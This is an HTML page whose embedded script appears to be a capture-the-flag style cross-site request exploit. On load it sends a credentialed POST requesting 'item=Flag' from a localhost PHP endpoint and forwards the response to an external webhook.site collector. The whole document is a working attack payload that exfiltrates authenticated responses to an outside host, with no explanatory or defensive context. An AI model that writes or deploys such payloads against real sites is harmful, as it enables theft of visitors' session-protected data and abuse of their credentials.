<!DOCTYPE html>
<html>
<body>
<script>
const xhr = new XMLHttpRequest();

xhr.open("POST", "http://localhost/index.php", true);

xhr.setRequestHeader(
    "Content-Type",
    "application/x-www-form-urlencoded"
);

xhr.withCredentials = true;

xhr.onload = function () {
    const response = xhr.responseText;

    const webhook = new XMLHttpRequest();

    webhook.open(
        "POST",
        "https://webhook.site/334b37cd-fef2-4042-b3af-b4f5cd1c3d00",
        true
    );

    webhook.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
    );

    webhook.send("c=" + encodeURIComponent(response));
};

xhr.onerror = function () {
    console.log("Request failed");
};

xhr.send("item=Flag");
</script>
</body>
</html>
